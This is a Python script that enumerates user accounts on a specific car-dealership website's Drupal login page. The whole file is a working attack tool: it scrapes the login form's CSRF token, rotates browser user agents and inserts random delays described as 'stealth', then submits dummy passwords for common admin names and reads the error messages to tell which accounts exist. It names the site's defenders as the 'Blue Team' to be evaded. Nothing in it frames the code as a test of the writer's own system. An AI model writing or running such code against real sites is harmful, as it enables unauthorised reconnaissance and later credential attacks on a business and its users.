import requests
import time
import random
from bs4 import BeautifulSoup

target_url = "https://www.montcalmautosales.com/user/login"
# Common Drupal account names to test
usernames = ["admin", "webmaster", "editor", "drupal_admin", "it_staff"]

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Version/17.0 Safari/605.1.15"
]

def stealth_account_test():
    session = requests.Session()
    print(f"[*] Initializing stealth session for {target_url}...")

    for user in usernames:
        try:
            # 1. GET the login page to grab the CSRF form_build_id
            headers = {'User-Agent': random.choice(user_agents)}
            initial_resp = session.get(target_url, headers=headers, timeout=10)
            
            # Parse HTML for hidden form fields required by Drupal
            soup = BeautifulSoup(initial_resp.text, 'html.parser')
            form_build_id = soup.find('input', {'name': 'form_build_id'})['value']
            
            # 2. Adaptive Delay (mimic a slow typist)
            delay = random.uniform(5, 15)
            print(f"[*] Waiting {delay:.2f}s before testing user: {user}")
            time.sleep(delay)

            # 3. Attempt login with a dummy password
            payload = {
                'name': user,
                'pass': 'NotThePassword123!',
                'form_id': 'user_login_form',
                'form_build_id': form_build_id,
                'op': 'Log+in'
            }
            
            response = session.post(target_url, data=payload, headers=headers, timeout=10)

            # Analyze the response to see if the error message changes 
            # (e.g., "User not found" vs "Wrong password")
            if "Unrecognized username" in response.text:
                print(f"[-] User '{user}' does not exist.")
            else:
                print(f"[!] POTENTIAL HIT: Response changed for '{user}'. Manual check required.")

        except Exception as e:
            print(f"[X] Connection Reset by Blue Team: {e}")

if __name__ == "__main__":
    stealth_account_test()
